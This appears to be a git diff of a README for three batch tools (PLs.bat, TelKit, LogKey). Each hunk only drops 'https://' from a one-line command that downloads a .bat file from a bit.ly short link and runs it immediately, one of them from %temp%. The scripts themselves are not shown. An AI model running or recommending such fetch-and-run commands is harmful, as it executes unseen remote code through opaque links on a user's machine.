@@ -18,7 +18,7 @@ Here are the individual batchfiles and instructions on how to use them.
 #### Download and Run PLs.bat
 You may add additional arguments to the end of the command. Please refer to the **Arguments** section for more information.
 ```Batch
-cmd /c curl -Lo pls.bat https://bit.ly/PLs-bat & pls
+cmd /c curl -Lo pls.bat bit.ly/PLs-bat & pls
 ```
 
 #### Arguments
@@ -37,7 +37,7 @@ Without arguments, or with missing arguments, the script will prompt you for the
 #### Download and Run TelKit
 You may add additional arguments to the end of the command. Please refer to the **Arguments** section for more information.
 ```Batch
-cmd /c cd %temp% & curl -Lo tk.bat https://bit.ly/PLs-tk & tk
+cmd /c cd %temp% & curl -Lo tk.bat bit.ly/PLs-tk & tk
 ```
 
 #### Arguments
@@ -55,7 +55,7 @@ When arguments are missing or not provided, the script will prompt you for the t
 **Download and Run LogKey**
 You may add additional arguments to the end of the command. Please refer to the **Arguments** section for more information.
 ```Batch
-cmd /c curl -Lo lk.bat https://bit.ly/PLs-lk & lk
+cmd /c curl -Lo lk.bat bit.ly/PLs-lk & lk
 ```
 
 #### Arguments
